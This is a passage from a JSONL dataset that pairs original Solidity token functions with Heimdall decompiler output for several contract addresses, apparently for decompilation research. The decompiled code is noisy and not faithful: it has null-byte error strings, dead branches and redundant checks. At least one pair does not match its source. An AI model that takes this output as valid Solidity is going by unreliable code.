0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_i = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_f > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_e / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_f > store_l) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_h) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_f > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x19;\n        var_g = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_d / 0x01))) {\n            if (address(arg0) == (address(store_d / 0x01))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x6B329f435e8cc485Cfd5a922d080d22a3956A709", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x0aCf2a152c8551ba658D8D16a7Fdc1b3230d7b37", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function excludeFromFee(address account) public onlyOwner {\r\n        _isExcludedFromFee[account] = true;\r\n    }", "heimdall_decompiled_code": "function excludeFromFee(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(arg0);\n        var_g = 0x03;\n        storage_map_p[var_f] = (0x01 * 0x01) | (uint248(storage_map_p[var_f]));\n    }"}
{"contract_address": "0x76c084565eAE819c9D3647FC2934f6734995f92C", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x08;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function updateDevWallet(address newWallet) external onlyOwner {\r\n        emit devWalletUpdated(newWallet, devWallet);\r\n        devWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function updateDevWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit devWalletUpdated(address(arg0), address(devWallet));\n        devWallet = (address(arg0)) | (uint96(devWallet));\n    }"}
{"contract_address": "0x700604d812AD038BB5fE00ddDB8c0375E65A307C", "original_solidity_code": "function manualSend() external {\r\n        require(_msgSender() == shiaburnWallet);\r\n        uint256 contractETHBalance = address(this).balance;\r\n        if (contractETHBalance > 0) {\r\n            sendETHToFee(contractETHBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSend() public {\n        require(address(msg.sender) == (address(store_f / 0x01)));\n        require(!(address(this).balance > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_a = 0x40 + var_a;\n        var_b = 0x1a;\n        var_c = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x02 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_a) + 0x20) - (0x04 + var_a);\n        uint256 var_f = var_a.length;\n        require(!(0 > var_a.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_g = 0;\n        var_h = var_i;\n        require(!(0x20 > var_a.length), \"SafeMath: division by zero\");\n        var_g = 0;\n        require(0x02);\n        var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x12;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).transfer(address(this).balance / 0x02);\n        var_a = 0x40 + var_a;\n        var_d = 0x1a;\n        var_l = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x02 > 0);\n        require(0x02);\n        var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x12;\n        (bool success, bytes memory ret0) = address(store_s / 0x01).transfer(address(this).balance / 0x02);\n    }"}
{"contract_address": "0xC2C72Ff9E11DdC1A269c1c161dd07d66855A545E", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"SafeMath: multiplication overflow\");\n        require(address(arg0) - 0, \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_b > _reduceBuyTaxAt, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_d == ((arg1 * store_d) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_d) / arg1) == store_d, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        address var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_d) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_f[var_a] > (storage_map_f[var_a] + ((arg1 * store_d) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_f[var_a] + ((arg1 * store_d) / 0x64) < storage_map_f[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_f[var_a] = storage_map_f[var_a] + ((arg1 * store_d) / 0x64);\n        uint256 var_j = (arg1 * store_d) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_d) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_e = 0x40 + var_e;\n        var_j = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_f[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_f[var_a] - arg1) > storage_map_f[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_f[var_a] = storage_map_f[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_d) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_s = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_t = var_e.length;\n        uint256 var_u = 0;\n        var_v = var_m;\n        var_u = 0;\n        if (!(arg1 - ((arg1 * store_d) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_f[var_a] > _maxTaxSwap) {\n            }\n            if (!store_b > store_h) {\n            }\n            if (!storage_map_f[var_a] > _taxSwapThreshold) {\n            }\n            if (store_b > _reduceSellTaxAt) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_d) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_b > _reduceSellTaxAt, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_l / 0x01))) {\n            if (address(arg0) == (address(store_l / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa60ecbb555a15D31AaCfd8d44a456A81699e4C9a", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xaB46fe68E6824c1004700052e359F63FB9C2EF8b", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xB52Bb372A4C3336A6f3ddd8fB3dE8d6DF735Ad50", "original_solidity_code": "function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(sender, recipient, amount);\\r\\n      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public payable {\n        require(address(arg0));\n        require(address(arg1));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(arg0);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = address(arg0);\n        var_d = 0x06;\n        require(!storage_map_d[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!(arg2 > storage_map_d[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_d[var_c] = storage_map_d[var_c] - arg2;\n        var_c = address(arg1);\n        var_d = 0x04;\n        require(!((arg2 + storage_map_d[var_c]) < storage_map_d[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg2 > storage_map_d[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_d[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
{"contract_address": "0xe7fEA96bA7a112602bCfe9a472473627D88c3De5", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x05f5e100 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if (!0x05f5e100 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        if (0x09) {\n                            if (!0x05f5e100 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3E04B913dD981C1E6DF41aCBD8fB12A0B2A69171", "original_solidity_code": "function getCirculatingSupply() public view returns (uint256) {\r\n        return (totalSupply - balanceOf[DEAD] - balanceOf[ZERO]);\r\n    }", "heimdall_decompiled_code": "function getCirculatingSupply() public view {\n        var_a = 0x02;\n        var_b = 0xdead;\n        if (0x12) {\n            if ((0x01 == 0x01) | !0x15) {\n                var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                if (!(0x15 - store_f) > 0x15) {\n                    var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x11;\n                    if (0x0a) {\n                        if (0x0a == 0x01) {\n                            if (0x0a == 0x02) {\n                                if (!0x12 > 0xff) {\n                                    var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_c = 0x11;\n                                    if (!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20))) {\n                                        if (!0x12 > 0x01) {\n                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_c = 0x11;\n                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                    var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_c = 0x11;\n                                                    if (!0) {\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xb4F77c4Cb758aeA0364f50892D20E267be9805c4", "original_solidity_code": "function approve(address spender, uint256 Amount) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        _approve(Owner, spender, Amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"Value exceeds balance\");\n        require(address(arg0) - 0, \"Value exceeds balance\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"Value exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x97;\n        require(!(!bytes1(storage_map_d[var_a] / 0x01)), \"Value exceeds balance\");\n        require(!(!bytes1(storage_map_d[var_a] / 0x01)), \"Value exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x65;\n        require(!(storage_map_d[var_a] < arg1), \"Value exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x15;\n        var_g = 